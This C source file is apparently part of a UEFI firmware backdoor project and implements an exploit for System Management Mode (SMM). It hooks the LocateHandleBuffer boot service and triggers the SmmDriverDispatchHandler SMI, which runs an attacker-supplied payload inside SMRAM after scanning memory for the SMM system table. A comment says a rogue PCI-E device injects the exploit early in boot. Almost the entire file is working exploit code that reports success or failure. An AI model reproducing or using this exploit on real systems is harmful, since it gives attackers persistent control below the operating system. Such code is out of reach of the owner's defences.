#include <FrameworkSmm.h>

#include <Protocol/SmmBase2.h>
#include <Protocol/SmmCommunication.h>

#include <Guid/EventGroup.h>

#include <IndustryStandard/PeImage.h>

#include "../config.h"
#include "../interface.h"

#include "common.h"
#include "debug.h"
#include "loader.h"
#include "backdoor.h"
#include "exploit.h"
#include "virtmem.h"

EFI_LOCATE_HANDLE_BUFFER old_LocateHandleBuffer = NULL;

EXPLOIT_PROC m_ExploitProc = NULL;
BOOLEAN m_bSmmHandlerExecuted = FALSE;

// SMM communication structure
EFI_SMM_COMMUNICATE_HEADER m_CommunicateHeader;

// defined in backdoor.c
extern EFI_BOOT_SERVICES *m_BS;
extern EFI_SMRAM_DESCRIPTOR m_SmramMap[MAX_SMRAM_REGIONS];
extern UINTN m_SmramMapSize;

/*
    SmmDriverDispatchHandler() SMI handler of PiSmmCore used to load SMM drivers 
    when needed DXE drivers has been initialized and Firmware Volume protocol is 
    ready to use:

        EFI_STATUS
        EFIAPI
        SmmDriverDispatchHandler (
          IN     EFI_HANDLE  DispatchHandle,
          IN     CONST VOID  *Context,        OPTIONAL
          IN OUT VOID        *CommBuffer,     OPTIONAL
          IN OUT UINTN       *CommBufferSize  OPTIONAL
          )
        {
          // ...

          HandleBuffer = NULL;
          Status = gBS->LocateHandleBuffer (
                          ByProtocol,
                          &gEfiFirmwareVolume2ProtocolGuid,
                          NULL,
                          &HandleCount,
                          &HandleBuffer
                          );

          // ...


    This handler is being registered at the beginning of the SMM core exeuction and 
    being unregistered by SMM ready to lock event handler:

        EFI_STATUS
        EFIAPI
        SmmReadyToLockHandler (
          IN     EFI_HANDLE  DispatchHandle,
          IN     CONST VOID  *Context,        OPTIONAL
          IN OUT VOID        *CommBuffer,     OPTIONAL
          IN OUT UINTN       *CommBufferSize  OPTIONAL
          )
        {
          // ...

          //
          // Unregister SMI Handlers that are no required after the SMM driver dispatch is stopped
          //
          for (Index = 0; mSmmCoreSmiHandlers[Index].HandlerType != NULL; Index++) {
            if (mSmmCoreSmiHandlers[Index].UnRegister) {
              SmiHandlerUnRegister (mSmmCoreSmiHandlers[Index].DispatchHandle);
            }
          }

          // ...


    DXE part of SMM core registers DXE dispatch event handler and fires appropriate SMI to 
    execute SmmDriverDispatchHandler() when this event occurrs:

        VOID
        EFIAPI
        SmmIplDxeDispatchEventNotify (
          IN EFI_EVENT  Event,
          IN VOID       *Context
          )
        {
          // ...

          //
          // Keep calling the SMM Core Dispatcher until there is no request to restart it.
          //
          while (TRUE) {
            //
            // Use Guid to initialize EFI_SMM_COMMUNICATE_HEADER structure
            // Clear the buffer passed into the Software SMI.  This buffer will return
            // the status of the SMM Core Dispatcher.
            //
            CopyGuid (&mCommunicateHeader.HeaderGuid, (EFI_GUID *)Context);
            mCommunicateHeader.MessageLength = 1;
            mCommunicateHeader.Data[0] = 0;

            //
            // Generate the Software SMI and return the result
            //
            Size = sizeof (mCommunicateHeader);
            SmmCommunicationCommunicate (&mSmmCommunication, &mCommunicateHeader, &Size);

            //
            // Return if there is no request to restart the SMM Core Dispatcher
            //
            if (mCommunicateHeader.Data[0] != COMM_BUFFER_SMM_DISPATCH_RESTART) {
              return;
            }

            //
            // Close all SMRAM ranges to protect SMRAM
            // NOTE: SMRR is enabled by CPU SMM driver by calling SmmCpuFeaturesInitializeProcessor() 
            //       from SmmCpuFeaturesLib so no need to reset the SMRAM to UC in MTRR.
            //
            Status = mSmmAccess->Close (mSmmAccess);

          // ...


    This exploit is able to work due to the fact that PCI-E bus intialization 
    happens way before DXE dispatch event, so it overwrites LocateHandleBuffer() 
    with the arbitrary SMM code address and manually fires SmmDriverDispatchHandler() 
    SMI in order to execute this code.

    Rogue PCI-E device is used to inject this exploit into the boot sequence of the
    target machine before DXE dispatch event.
*/
//--------------------------------------------------------------------------------------
// to be used in FindSmst() function
#define SMST_MEM_ALIGN sizeof(UINT64)

// SMRAM region is usually located in lower part of physical memory range
#define SMST_CHECK_ADDR(_addr_) ((UINT64)(_addr_) != 0 && ((UINT64)(_addr_) >> 32) == 0)

EFI_SMM_SYSTEM_TABLE2 *FindSmst(void)
{
    UINTN i = 0, p = 0, n = 0;

    // for VirtualAddrValid() calls
    UINT64 Cr3 = __readcr3();

    // enumerate SMRAM regions
    for (i = 0; i < m_SmramMapSize / sizeof(EFI_SMRAM_DESCRIPTOR); i += 1)
    {
        // enumerate memory pages for each region
        for (p = 0; p < m_SmramMap[i].PhysicalSize; p += PAGE_SIZE)
        {
            UINT64 Addr = m_SmramMap[i].PhysicalStart + p;

            // check for valid virtual address
            if (VirtualAddrValid(Addr, Cr3))
            {
                for (n = 0; n < PAGE_SIZE; n += SMST_MEM_ALIGN)
                {
                    EFI_SMM_SYSTEM_TABLE2 *Smst = (EFI_SMM_SYSTEM_TABLE2 *)(Addr + n);

                    // check for valid SMM system table 2 header
                    if (Smst->Hdr.Signature == SMM_SMST_SIGNATURE && (Smst->Hdr.Revision >> 16) != 0)
                    {
                        // sanity check some function pointers as well
                        if (SMST_CHECK_ADDR(Smst->SmmAllocatePool) &&
                            SMST_CHECK_ADDR(Smst->SmmAllocatePages) &&
                            SMST_CHECK_ADDR(Smst->SmmFreePool) &&
                            SMST_CHECK_ADDR(Smst->SmmFreePages))
                        {
                            return Smst;
                        }
                    }
                }
            }
        }
    }

    return NULL;
}

EFI_STATUS EFIAPI new_LocateHandleBuffer(
    EFI_LOCATE_SEARCH_TYPE SearchType, 
    EFI_GUID *Protocol, 
    VOID *SearchKey, 
    UINTN *NoHandles, 
    EFI_HANDLE **Buffer)
{    
    EFI_SMM_SYSTEM_TABLE2 *Smst = NULL;

    // indicate successful exploitation
    m_bSmmHandlerExecuted = TRUE; 
    
    if (m_ExploitProc)
    {
        // find SMM system table
        if ((Smst = FindSmst()) != NULL)
        {
            // call payoad
            m_ExploitProc(Smst);
        }  
    }

    /*
        Here we need to return an error code to immediately exit
        from the SmmDriverDispatchHandler() and prevent any side effects.
    */
    return EFI_NOT_FOUND;
}
//--------------------------------------------------------------------------------------
EFI_STATUS Exploit(EXPLOIT_PROC ExploitProc)
{
    EFI_STATUS Status = 0;    
    EFI_SMM_BASE2_PROTOCOL *SmmBase = NULL;    
    EFI_SMM_COMMUNICATION_PROTOCOL *SmmComm = NULL;   
    UINTN Size = sizeof(m_CommunicateHeader); 

    m_ExploitProc = ExploitProc;
    m_bSmmHandlerExecuted = FALSE;    

    if ((Status = m_BS->LocateProtocol(&gEfiSmmBase2ProtocolGuid, NULL, (VOID **)&SmmBase)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
        return Status;
    }

    if ((Status = m_BS->LocateProtocol(&gEfiSmmCommunicationProtocolGuid, NULL, (VOID **)&SmmComm)) != EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, "LocateProtocol() ERROR 0x%x\r\n", Status);   
        return Status;
    }

    DbgMsg(
        __FILE__, __LINE__, 
        "SMM communicate header is at "FPTR"\r\n", &m_CommunicateHeader
    );

    // set up communicate header
    m_BS->CopyMem(&m_CommunicateHeader.HeaderGuid, &gEfiEventDxeDispatchGuid, sizeof(EFI_GUID));

    m_CommunicateHeader.MessageLength = 1;
    m_CommunicateHeader.Data[0] = 0;

    // hook LocateHandleBuffer()
    old_LocateHandleBuffer = m_BS->LocateHandleBuffer;
    m_BS->LocateHandleBuffer = new_LocateHandleBuffer;

    DbgMsg(__FILE__, __LINE__, "Executing SMM callback...\r\n");

    // call SMM callback
    Status = SmmComm->Communicate(SmmComm, &m_CommunicateHeader, &Size);

    if (!m_bSmmHandlerExecuted)
    {
        // fire any synchronous SMI to process pending SMM calls and execute arbitrary code
        GenerateSoftwareSMI(0, 0xff);
    }

    // restore LocateHandleBuffer()
    m_BS->LocateHandleBuffer = old_LocateHandleBuffer;
    
    DbgMsg(
        __FILE__, __LINE__, 
        "Communicate(): status = 0x%.8x, size = 0x%.8x\r\n", Status, Size
    );

    if (m_bSmmHandlerExecuted)
    {
        DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Exploitation success\r\n");        

        return EFI_SUCCESS;
    }
    
    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Exploitation fails\r\n");        

    return EFI_LOAD_ERROR;
}
//--------------------------------------------------------------------------------------
// EoF
